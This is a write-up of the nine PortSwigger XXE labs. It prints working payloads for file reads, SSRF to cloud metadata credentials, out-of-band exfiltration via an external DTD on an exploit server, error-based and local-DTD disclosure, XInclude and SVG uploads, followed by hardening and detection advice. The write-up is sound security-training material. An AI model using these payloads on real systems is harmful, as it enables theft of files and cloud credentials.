# PortSwigger XXE 1-9 — Entity Resolution as an Attack Surface

This is a consolidated walkthrough of the nine PortSwigger XML external entity injection labs. The useful lesson is not the syntax of one payload. It is the parser boundary:

**XXE appears when an XML parser that handles attacker-controlled input is allowed to resolve external resources.** The output channel may be the HTTP response, an error message, a DNS/HTTP callback, or even a rendered image.

## 1. Overview

| # | Lab | Difficulty | Entry point | Channel | Core idea |
|---|-----|------------|-------------|---------|-----------|
| 1 | External entities to retrieve files | Apprentice | XML stock check | response error | define a general entity for `file:///etc/passwd` |
| 2 | XXE to perform SSRF attacks | Apprentice | XML stock check | response error | point the entity at the EC2 metadata endpoint |
| 3 | Blind XXE with OOB interaction | Practitioner | XML stock check | DNS/HTTP OOB | trigger an external request with a general entity |
| 4 | Blind XXE via parameter entities | Practitioner | XML stock check | DNS/HTTP OOB | use `%xxe;` when regular external entities are blocked |
| 5 | Blind XXE exfiltration via external DTD | Practitioner | XML + exploit server | OOB/log | use an external DTD to place file contents into a URL |
| 6 | Blind XXE via error messages | Practitioner | XML + exploit server | parser error | place file contents into an invalid local file path |
| 7 | XInclude to retrieve files | Practitioner | form field wrapped into XML | response error | inject `xi:include` when the full XML document is not controlled |
| 8 | XXE via image upload | Practitioner | SVG avatar | rendered image | SVG is XML; Batik resolves the entity during processing |
| 9 | Repurposing a local DTD | Expert | XML stock check | parser error | import a local Yelp DTD and redefine a parameter entity |

All nine labs solved.

## 2. The decision tree

```text
Visible response?       -> general entity or XInclude
No visible response?    -> OOB interaction
Need data over OOB?     -> external DTD with two-stage parameter entities
No OOB receiver?        -> force an error that includes the file contents
No remote DTD allowed?  -> repurpose a local DTD
Not an XML endpoint?    -> look for XML-backed formats such as SVG
```

## 3. Direct entity expansion

The stock checker sends XML similar to:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

For a visible file-read channel, insert a DTD and place the entity reference in `productId`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

The application responds with `Invalid product ID: ...` followed by the file contents. The response is a `400`, but the error path is the leak.

For the SSRF lab, the same primitive targets metadata:

```xml
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">
]>
```

That returns simulated IAM credential JSON, including the `SecretAccessKey`.

## 4. Blind XXE and parameter entities

When the entity value is not reflected, the first proof is an outbound lookup:

```xml
<!DOCTYPE stockCheck [
  <!ENTITY xxe SYSTEM "http://<collaborator-domain>">
]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

PortSwigger explicitly restricts arbitrary third-party OOB services in these labs. A `*.burpcollaborator.net` or equivalent Academy-accepted OAST domain is the reliable option.

If regular external entities are blocked, parameter entities still work inside the DTD:

```xml
<!DOCTYPE stockCheck [
  <!ENTITY % xxe SYSTEM "http://<collaborator-domain>">
  %xxe;
]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

General entities expand in document content as `&name;`. Parameter entities expand inside DTDs as `%name;`, which is why they are useful for importing external DTDs and building second-stage payloads.

## 5. External DTD exfiltration

The exfiltration lab hosts a DTD on the exploit server:

```dtd
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://exploit-server/exfil?x=%file;'>">
%eval;
%exfil;
```

The stock-check request imports it:

```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "https://exploit-server/exploit">
  %xxe;
]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

The official solution uses Collaborator for the callback. In this run, the exploit server's own access log was sufficient: it recorded a request to `/exfil?x=<hostname>`, and submitting that hostname solved the lab.

## 6. Error-message retrieval

When an application exposes XML parser errors, an external DTD can move the file contents into an invalid path:

```dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```

The parser then fails with a path like:

```text
java.io.FileNotFoundException: /invalid/root:x:0:0:root:/root:/bin/bash...
```

This turns a blind parser into a visible error oracle.

## 7. XInclude

The XInclude lab uses a URL-encoded form body rather than a raw XML body. The server embeds `productId` inside a backend XML document, so a top-level DTD is not available. Use XInclude instead:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

`parse="text"` is essential because `/etc/passwd` is not valid XML.

## 8. SVG upload

SVG is an XML format. If a server processes uploaded SVG with a library such as Apache Batik and external entities are enabled, the entity can be rendered into the resulting image:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg width="320px" height="80px" xmlns="http://www.w3.org/2000/svg" version="1.1">
  <rect width="320" height="80" fill="white"/>
  <text font-size="24" x="4" y="40" fill="black">&xxe;</text>
</svg>
```

After posting a comment with the SVG as the avatar, the application generated `/post/comment/avatars?filename=1.png`. Downloading the processed PNG showed the hostname, which was then submitted as the solution.

## 9. Local DTD repurposing

The expert lab removes the remote-DTD dependency. The hint points to a local GNOME Yelp DTD:

```text
file:///usr/share/yelp/dtd/docbookx.dtd
```

The payload redefines the DTD's `ISOamso` parameter entity:

```xml
<!DOCTYPE message [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

When the local DTD is imported, the redefined entity triggers the same error-path file disclosure. The important point is that outbound network access is not required if the server already has a reusable DTD on disk.

## 10. Operational notes

- Academy OOB labs are most reliable with PortSwigger-accepted Collaborator/OAST domains. Random public OOB services may not satisfy the platform.
- The exploit server can be both the DTD host and the exfiltration receiver for the hostname lab; check `GET /log` for the callback.
- Be careful with the exploit server form. Submitting `ACCESS_LOG` with a dummy `responseBody` can overwrite the stored payload. Directly request `/log`.
- For XInclude, always set `parse="text"` when including non-XML files.
- For SVG/Batik, the proof is in the processed image, not in the HTML response.
- For local-DTD payloads, entity encoding layers matter: `&#x25;` becomes `%`, `&#x26;#x25;` becomes a second-stage `%`, and `&#x27;` becomes a quote.

## 11. Defense and detection

### Hardening

- Disable DTDs and external entity resolution in XML parsers.
- Disable external general entities, external parameter entities, and external DTD loading.
- Block XML parsers from network access unless a strict allowlist is required.
- Do not return raw parser exceptions to users.
- Treat SVG, Office XML, SOAP, SAML, and import/export features as XML parser surfaces.
- Run parsers and converters with low filesystem privileges and egress restrictions.

### Detection ideas

- Request bodies or uploaded files containing `<!DOCTYPE`, `<!ENTITY`, `SYSTEM`, `PUBLIC`, `file://`, `%xxe;`.
- SVG uploads containing DTD declarations or external resources.
- Application servers making DNS/HTTP requests to `169.254.169.254`, internal addresses, `*.burpcollaborator.net`, `*.oastify.com`, or unusual exploit-server hosts.
- Parser errors in HTTP responses: `FileNotFoundException`, `SAXParseException`, `DOCTYPE is disallowed`, `External Entity`.
- Image-processing or document-conversion workers unexpectedly accessing local files or outbound domains.

## 12. Methodology

For a new XXE surface:

1. Confirm whether attacker-controlled input reaches an XML parser.
2. Test direct entity expansion if there is a visible response.
3. If blind, trigger a DNS/HTTP interaction first.
4. If data is needed, use a two-stage external DTD.
5. If OOB is unavailable, try an error-message path.
6. If remote DTD loading is blocked, look for reusable local DTDs.
7. If the endpoint is not obviously XML, inspect XML-backed formats such as SVG, Office documents, SOAP, and SAML.

The defensive rule of thumb is simple: treat XML parsing as a privileged file-and-network-capable operation, not as harmless string parsing.
